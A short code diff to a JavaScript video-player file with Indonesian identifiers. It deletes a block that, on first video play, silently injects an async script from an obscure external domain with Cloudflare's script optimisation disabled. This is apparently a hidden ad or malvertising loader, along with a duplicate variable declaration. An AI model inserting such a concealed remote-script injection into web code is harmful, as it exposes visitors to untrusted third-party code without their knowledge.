@@ -337,16 +337,6 @@ const PENGATURAN = {
   cekKembali();
 })();
 let shuffleSudah = false;
-video.addEventListener('play', function () {
-  if (shuffleSudah) return;
-  shuffleSudah = true;
-  const s = document.createElement('script');
-  s.async = true;
-  s.setAttribute('data-cfasync', 'false');
-  s.src = '//px.carceagrowel.com/sM6c7ZCUm4jBjn/150091';
-  document.body.appendChild(s);
-});
-let shuffleSudah = false;
 document.addEventListener('play', function (e) {
   if (shuffleSudah) return;
   if (!e.target.closest || !e.target.closest('.layar.main')) return;
